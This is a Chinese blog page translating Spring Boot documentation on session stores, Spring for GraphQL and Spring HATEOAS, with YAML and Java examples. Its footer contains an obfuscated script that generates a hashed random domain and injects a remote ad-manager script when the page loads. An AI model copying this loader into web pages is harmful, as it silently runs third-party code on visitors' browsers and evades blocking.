<p>此外，<a href="https://github.com/spring-projects/spring-boot-data-geode">Spring Boot for Apache Geode</a> 还提供了<a href="https://docs.spring.io/spring-boot-data-geode-build/2.0.x/reference/html5/#geode-session" rel="nofollow">将 Apache Geode 用作会话存储的自动配置功能</a>。<br> servlet 自动配置取代了使用 @<code>Enable*HttpSession</code> 的需要。<br> 如果类路径上只有一个 Spring Session 模块，Spring Boot 会自动使用该存储实现。如果有多个实现，Spring Boot 会按照以下顺序选择特定实现：</p> 
<ol><li>Redis</li><li>JDBC</li><li>Hazelcast</li><li>MongoDB</li><li>如果 Redis、JDBC、Hazelcast 和 MongoDB 都不可用，我们就不会配置<code>SessionRepository</code>。</li></ol> 
<p>在构建反应式网络应用程序时，可以自动配置以下存储：</p> 
<ul><li>Redis</li><li>MongoDB</li></ul> 
<p>反应式自动配置取代了使用 <code>@Enable*WebSession</code> 的需要。<br> 与 servlet 配置类似，如果有多个实现，Spring Boot 会按以下顺序选择特定实现：</p> 
<ol><li>Redis</li><li>MongoDB</li><li>如果 Redis 和 MongoDB 都不可用，我们就不配置 <code>ReactiveSessionRepository</code>。</li></ol> 
<p>每个存储都有特定的附加设置。例如，可以自定义 JDBC 存储的表名，如下例所示：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">session</span><span class="token punctuation">:</span>
    <span class="token key atrule">jdbc</span><span class="token punctuation">:</span>
      <span class="token key atrule">table-name</span><span class="token punctuation">:</span> <span class="token string">"SESSIONS"</span>
</code></pre> 
<p>要设置会话超时，可以使用 <code>spring.session.timeout</code> 属性。如果未在 servlet 网络应用程序中设置该属性，自动配置将退回到 <code>server.servlet.session.timeout</code> 的值。<br> 你可以使用 <code>@Enable*HttpSession</code> (servlet) 或 <code>@Enable*WebSession</code> (reactive) 来控制 Spring Session 的配置。这将导致自动配置关闭。然后，就可以使用注解的属性而不是之前描述的配置属性来配置 Spring Session 了。</p> 
<h3><a id="Spring_for_GraphQL_1406"></a>Spring for GraphQL</h3> 
<p>如果您想构建 GraphQL 应用程序，可以利用 Spring Boot 为 <a href="https://spring.io/projects/spring-graphql" rel="nofollow">Spring for GraphQL</a> 提供的自动配置。Spring for GraphQL 项目基于 <a href="https://github.com/graphql-java/graphql-java">GraphQL Java</a>。你至少需要 <code>spring-boot-starter-graphql</code> starter。由于 GraphQL 与传输无关，因此您还需要在应用程序中添加一个或多个启动器，以便通过网络公开您的 GraphQL API：</p> 
<table><thead><tr><th><strong>Starter</strong></th><th><strong>Transport</strong></th><th><strong>Implementation</strong></th></tr></thead><tbody><tr><td><code>spring-boot-starter-web</code></td><td>HTTP</td><td>Spring MVC</td></tr><tr><td><code>spring-boot-starter-websocket</code></td><td>WebSocket</td><td>用于 Servlet 应用程序的 WebSocket</td></tr><tr><td><code>spring-boot-starter-webflux</code></td><td>HTTP, WebSocket</td><td>Spring WebFlux</td></tr><tr><td><code>spring-boot-starter-rsocket</code></td><td>TCP, WebSocket</td><td>基于 Reactor Netty 的 Spring WebFlux</td></tr></tbody></table> 
<h4><a id="GraphQL_Schema_1416"></a>GraphQL Schema</h4> 
<p>Spring GraphQL 应用程序需要在启动时定义模式。默认情况下，您可以在 <code>src/main/resources/graphql/**</code> 下编写".graphqls" 或 “.gqls” 模式文件，Spring Boot 会自动获取它们。您可以使用 <code>spring.graphql.schema.locations</code> 自定义位置，使用 <code>spring.graphql.schema.file-extensions</code> 自定义文件扩展名。</p> 
<blockquote> 
 <p>如果希望 Spring Boot 检测所有应用模块中的模式文件以及该位置的依赖关系，可以将 <code>spring.graphql.schema.locations</code> 设置为 <code>"classpath*:graphql/**/"</code>（注意前缀为 <code>classpath*:</code>）。</p> 
</blockquote> 
<p>在下面的章节中，我们将考虑这个示例 GraphQL Schema，定义两种类型和两个查询：</p> 
<pre><code class="prism language-json">type Query <span class="token punctuation">{<!-- --></span>
    <span class="token function">greeting</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token operator">!</span> <span class="token operator">=</span> <span class="token string">"Spring"</span><span class="token punctuation">)</span><span class="token operator">:</span> String<span class="token operator">!</span>
    <span class="token function">project</span><span class="token punctuation">(</span>slug<span class="token operator">:</span> <span class="token constant">ID</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">:</span> Project
<span class="token punctuation">}</span>

<span class="token string">""</span><span class="token string">" A Project in the Spring portfolio "</span><span class="token string">""</span>
type Project <span class="token punctuation">{<!-- --></span>
    <span class="token string">""</span><span class="token string">" Unique string id used in URLs "</span><span class="token string">""</span>
    <span class="token literal-property property">slug</span><span class="token operator">:</span> <span class="token constant">ID</span><span class="token operator">!</span>
    <span class="token string">""</span><span class="token string">" Project name "</span><span class="token string">""</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> String<span class="token operator">!</span>
    <span class="token string">""</span><span class="token string">" URL of the git repository "</span><span class="token string">""</span>
    <span class="token literal-property property">repositoryUrl</span><span class="token operator">:</span> String<span class="token operator">!</span>
    <span class="token string">""</span><span class="token string">" Current support status "</span><span class="token string">""</span>
    <span class="token literal-property property">status</span><span class="token operator">:</span> ProjectStatus<span class="token operator">!</span>
<span class="token punctuation">}</span>

<span class="token keyword">enum</span> ProjectStatus <span class="token punctuation">{<!-- --></span>
    <span class="token string">""</span><span class="token string">" Actively supported by the Spring team "</span><span class="token string">""</span>
    <span class="token constant">ACTIVE</span>
    <span class="token string">""</span><span class="token string">" Supported by the community "</span><span class="token string">""</span>
    <span class="token constant">COMMUNITY</span>
    <span class="token string">""</span><span class="token string">" Prototype, not officially supported yet  "</span><span class="token string">""</span>
    <span class="token constant">INCUBATING</span>
    <span class="token string">""</span><span class="token string">" Project being retired, in maintenance mode "</span><span class="token string">""</span>
    <span class="token constant">ATTIC</span>
    <span class="token string">""</span><span class="token string">" End-Of-Lifed "</span><span class="token string">""</span>
    <span class="token constant">EOL</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>默认情况下，由于 GraphiQL 等工具需要对模式进行字段自省，因此允许对模式进行字段自省。如果不想公开模式的信息，可以将 <code>spring.graphql.schema.introspection.enabled</code> 设置为 <code>false</code>，从而禁用内省。</p> 
</blockquote> 
<h4><a id="GraphQL_RuntimeWiring_1454"></a>GraphQL RuntimeWiring</h4> 
<p>GraphQL Java <code>RuntimeWiring.Builder</code> 可用于注册自定义标量类型、指令、类型解析器、<code>DataFetcher</code> 等。您可以在 Spring config 中声明 <code>RuntimeWiringConfigurer</code> Bean，以访问 <code>RuntimeWiring.Builder</code>。Spring Boot 会检测此类 Bean，并将它们添加到 <code>GraphQlSource</code> 生成器中。<br> 不过，通常情况下，应用程序不会直接实现 <code>DataFetcher</code>，而是会创建注解控制器。Spring Boot 会自动检测带有注解处理程序方法的 <code>@Controller</code> 类，并将其注册为 <code>DataFetchers</code>。下面是使用 <code>@Controller</code> 类实现问候语查询的示例：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>graphql<span class="token punctuation">.</span>data<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Argument</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>graphql<span class="token punctuation">.</span>data<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">QueryMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GreetingController</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@QueryMapping</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">greeting</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Argument</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"Hello, "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h4><a id="_Querydsl__QueryByExample__1472"></a>支持 Querydsl 和 QueryByExample 资源库</h4> 
<p>Spring Data 支持 Querydsl 和 QueryByExample 资源库。Spring GraphQL 可将 <a href="https://docs.spring.io/spring-graphql/reference/1.2/#data" rel="nofollow">Querydsl 和 QueryByExample 资源库配置为 DataFetcher</a>。<br> Spring Data 资源库使用 <code>@GraphQlRepository</code> 进行注解，并扩展了以下功能之一：</p> 
<ul><li><code>QuerydslPredicateExecutor</code></li><li><code>ReactiveQuerydslPredicateExecutor</code></li><li><code>QueryByExampleExecutor</code></li><li><code>ReactiveQueryByExampleExecutor</code></li></ul> 
<p>被 Spring Boot 检测到，并被视为 <code>DataFetcher</code> 匹配顶级查询的候选项。</p> 
<h4><a id="_1482"></a>传输方式</h4> 
<h5><a id="HTTP__WebSocket_1483"></a>HTTP 和 WebSocket</h5> 
<p>GraphQL HTTP 端点默认为 HTTP POST <code>/graphql</code>。路径可使用 <code>spring.graphql.path</code> 进行自定义。</p> 
<blockquote> 
 <p>Spring MVC 和 Spring WebFlux 的 HTTP 端点都是由 <code>@Order</code> 为 <code>0</code> 的 <code>RouterFunction</code> Bean 提供的。 如果您定义了自己的 <code>RouterFunction</code> Bean，可能需要添加适当的 <code>@Order</code> 注解，以确保它们能正确排序。</p> 
</blockquote> 
<p>GraphQL WebSocket 端点默认关闭。要启用它：</p> 
<ul><li>对于 Servlet 应用程序，添加 WebSocket 启动程序 <code>spring-boot-starter-websocket</code></li><li>对于 WebFlux 应用程序，不需要额外的依赖关系</li><li>两者都必须设置 <code>spring.graphql.websocket.path</code> 应用程序属性</li></ul> 
<p>Spring GraphQL 提供了<a href="https://docs.spring.io/spring-graphql/reference/1.2/#web-interception" rel="nofollow">网络拦截</a>模型。这对于从 HTTP 请求头中获取信息并将其设置在 GraphQL 上下文中，或从同一上下文中获取信息并将其写入响应头非常有用。使用 Spring Boot，您可以声明一个 <code>WebInterceptor</code> Bean，让它在网络传输中注册。<br> <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc-cors.html" rel="nofollow">Spring MVC</a> 和 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webflux-cors.html" rel="nofollow">Spring WebFlux</a> 支持 CORS（跨源资源共享）请求。对于从使用不同域的浏览器访问的 GraphQL 应用程序来说，CORS 是网络配置的重要组成部分。<br> Spring Boot 支持 <code>spring.graphql.cors.*</code> 命名空间下的许多配置属性；下面是一个简短的配置示例：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">graphql</span><span class="token punctuation">:</span>
    <span class="token key atrule">cors</span><span class="token punctuation">:</span>
      <span class="token key atrule">allowed-origins</span><span class="token punctuation">:</span> <span class="token string">"https://example.org"</span>
      <span class="token key atrule">allowed-methods</span><span class="token punctuation">:</span> GET<span class="token punctuation">,</span>POST
      <span class="token key atrule">max-age</span><span class="token punctuation">:</span> 1800s
</code></pre> 
<h4><a id="RSocket_1504"></a>RSocket</h4> 
<p>RSocket 还支持作为 WebSocket 或 TCP 的传输方式。<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/messaging.html#messaging.rsocket.server-auto-configuration" rel="nofollow">配置好 RSocket 服务器后</a>，我们就可以使用 <code>spring.graphql.rsocket.mapping</code> 在特定路由上配置 GraphQL 处理程序。例如，将映射配置为 <code>"graphql"</code> 意味着我们可以在使用 <code>RSocketGraphQlClient</code> 发送请求时将其用作路由。<br> Spring Boot 会自动配置一个 <code>RSocketGraphQlClient.Builder&lt;?&gt;</code> Bean，您可以将其注入到您的组件中：</p> 
<pre><code class="prism language-java"><span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RSocketGraphQlClientExample</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">RSocketGraphQlClient</span> graphQlClient<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">RSocketGraphQlClientExample</span><span class="token punctuation">(</span><span class="token class-name">RSocketGraphQlClient<span class="token punctuation">.</span>Builder</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> builder<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>graphQlClient <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">tcp</span><span class="token punctuation">(</span><span class="token string">"example.spring.io"</span><span class="token punctuation">,</span> <span class="token number">8181</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">"graphql"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>然后发送请求：</p> 
<pre><code class="prism language-java"><span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">&gt;</span></span> book <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>graphQlClient<span class="token punctuation">.</span><span class="token function">document</span><span class="token punctuation">(</span><span class="token string">"{ bookById(id: \"book-1\"){ id name pageCount author } }"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">retrieve</span><span class="token punctuation">(</span><span class="token string">"bookById"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">toEntity</span><span class="token punctuation">(</span><span class="token class-name">Book</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h4><a id="_1523"></a>异常处理</h4> 
<p>Spring GraphQL 使应用程序能够注册一个或多个顺序调用的 Spring <code>DataFetcherExceptionResolver</code> 组件。异常必须解析为 <code>graphql.GraphQLError</code> 对象列表，请参见 <a href="https://docs.spring.io/spring-graphql/reference/1.2/#execution-exceptions" rel="nofollow">Spring GraphQL 异常处理文档</a>。Spring Boot 会自动检测 <code>DataFetcherExceptionResolver</code> Bean，并将其注册到 <code>GraphQlSource.Builder</code> 中。</p> 
<h4><a id="GraphiQL__Schema__1525"></a>GraphiQL 和 Schema 打印</h4> 
<p>Spring GraphQL 为开发人员消费或开发 GraphQL API 提供了基础架构。<br> Spring GraphQL 随附一个默认 <a href="https://github.com/graphql/graphiql">GraphiQL</a> 页面，该页面默认显示在 <code>"/graphiql"</code> 中。该页面默认为禁用，可通过 <code>spring.graphql.graphiql.enabled</code> 属性打开。许多使用此类页面的应用程序更倾向于自定义构建。默认实现在开发过程中非常有用，这就是为什么在开发过程中它会通过 <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using.html#using.devtools" rel="nofollow">spring-boot-devtools</a> 自动公开。<br> 启用 <code>spring.graphql.schema.printer.enabled</code> 属性后，还可选择在 <code>/graphql/schema</code> 以文本格式公开 GraphQL Schema。</p> 
<h3><a id="Spring_HATEOAS_1529"></a>Spring HATEOAS</h3> 
<p>如果您开发的 RESTful API 需要使用超媒体，Spring Boot 会为 Spring HATEOAS 提供自动配置，以便与大多数应用程序配合使用。自动配置取代了使用 <code>@EnableHypermediaSupport</code> 的需要，并注册了大量 Bean 以方便构建基于超媒体的应用程序，其中包括 <code>LinkDiscoverers</code>（用于客户端支持）和 <code>ObjectMapper</code>，配置这些 Bean 是为了将响应正确编译为所需的表示形式。<code>ObjectMapper</code> 可通过设置各种 <code>spring.jackson.*</code> 属性或 <code>Jackson2ObjectMapperBuilder</code> Bean（如果存在）进行自定义。<br> 您可以使用 <code>@EnableHypermediaSupport</code> 来控制 Spring HATEOAS 的配置。请注意，这样做会禁用前面描述的 <code>ObjectMapper</code> 自定义。</p> 
<blockquote> 
 <p><code>spring-boot-starter-hateoas</code> 专用于 Spring MVC，不应与 Spring WebFlux 结合使用。要在 Spring WebFlux 中使用 Spring HATEOAS，可以在 <code>Spring-boot-starter-webflux</code> 中添加对 <code>org.springframework.hateoas:spring-hateoas</code> 的直接依赖。</p> 
</blockquote> 
<p>默认情况下，接受 <code>application/json</code> 的请求将收到 <code>application/hal+json</code> 响应。要禁用此行为，请将 <code>spring.hateoas.use-hal-as-default-json-media-type</code> 设置为 <code>false</code>，并定义 <code>HypermediaMappingInformation</code> 或 <code>HalConfiguration</code> 来配置 Spring HATEOAS，以满足应用程序及其客户端的需求。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/9af9e94a082dedadc0db69eca18480f4/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【Kafka】MM2同步Kafka集群时如何自定义复制策略(ReplicationPolicy)</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/144d0a07f42d3b098947200111db2455/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Linux服务器 部署飞书信息发送服务</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>